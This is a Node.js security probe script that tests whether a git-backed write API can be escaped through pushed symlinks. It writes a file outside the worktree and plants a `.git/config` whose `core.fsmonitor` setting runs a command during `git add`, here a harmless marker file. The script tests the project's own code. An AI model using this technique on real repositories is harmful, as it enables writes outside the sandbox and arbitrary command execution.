// Usage, from the repository root: node docs/superpowers/spikes/authoring-baseline/probes/escape.mjs "$SCRATCH"
// (the authoring API plan's writing session, 2026-09-25; Task 1 re-runs it — [M1]).
// M1 — does commitThroughWorktree's path check hold against a symlink a PERSON pushed?
// A faithful copy of local-driver.ts's write loop (resolve + startsWith, mkdir, writeFile,
// then `git add -A`), run against a bare repository in the scratchpad only.
import { execFileSync } from 'node:child_process'
import { mkdtempSync, mkdirSync, writeFileSync, existsSync, readFileSync, rmSync, symlinkSync } from 'node:fs'
import { dirname, join, resolve, sep } from 'node:path'
const S = process.argv[2]
const ID = ['-c', 'user.name=t', '-c', 'user.email=t@t', '-c', 'commit.gpgsign=false']
const git = (cwd, args) => execFileSync('git', args, { cwd, encoding: 'utf8', env: { ...process.env, GIT_CONFIG_NOSYSTEM: '1', GIT_CONFIG_GLOBAL: '/dev/null' } })
rmSync(join(S, 'lab'), { recursive: true, force: true })
const lab = join(S, 'lab'); mkdirSync(lab)
const bare = join(lab, 'app.git'); git(lab, ['init', '-q', '--bare', '--initial-branch=main', bare])
const outside = join(lab, 'outside'); mkdirSync(outside)
// A person's commit: an ordinary file, a symlink OUT of the worktree, and a symlink to .git
const person = join(lab, 'person'); git(lab, ['clone', '-q', bare, person])
writeFileSync(join(person, 'README.md'), 'hello\n')
symlinkSync(outside, join(person, 'out'))          // absolute target outside
symlinkSync('.git', join(person, 'meta'))          // relative target: the worktree's own .git
git(person, ['add', '-A']); git(person, [...ID, 'commit', '-q', '-m', 'person'])
git(person, ['push', '-q', 'origin', 'main'])
// Manifest's commit, exactly as local-driver.ts writes it
function commitThroughWorktree(files) {
  const work = mkdtempSync(join(lab, 'wt-'))
  git(work, ['clone', '-q', '--branch', 'main', bare, '.'])
  for (const [rel, content] of Object.entries(files)) {
    if (rel.split('/').some((p) => p.toLowerCase() === '.git')) throw new Error(`assertWritablePaths refused ${rel}`)
    const target = resolve(work, rel)
    if (!target.startsWith(resolve(work) + sep)) throw new Error(`SOURCE_PATH_ESCAPE ${rel}`)
    mkdirSync(dirname(target), { recursive: true })
    writeFileSync(target, content, 'utf8')
  }
  try { git(work, ['add', '-A']); git(work, [...ID, 'commit', '-q', '-m', 'api']) } catch (e) { console.log('  git add/commit failed:', String(e.stderr ?? e).trim().split('\n').slice(-1)[0]) }
  return work
}
// (1) write through the symlink that points outside
commitThroughWorktree({ 'out/pwned.txt': 'written outside the worktree\n' })
console.log('(1) outside/pwned.txt exists after an API write of out/pwned.txt:', existsSync(join(outside, 'pwned.txt')))
// (2) write .git/config through the relative symlink, with core.fsmonitor, then git add runs
const marker = join(lab, 'FSMONITOR-RAN')
const cfg = `[core]\n\trepositoryformatversion = 0\n\tbare = false\n\tfsmonitor = touch ${marker}; false\n`
const w2 = commitThroughWorktree({ 'meta/config': cfg })
console.log('(2) worktree .git/config now names fsmonitor:', readFileSync(join(w2, '.git', 'config'), 'utf8').includes('fsmonitor'))
console.log('(2) the fsmonitor command RAN during git add:', existsSync(marker))
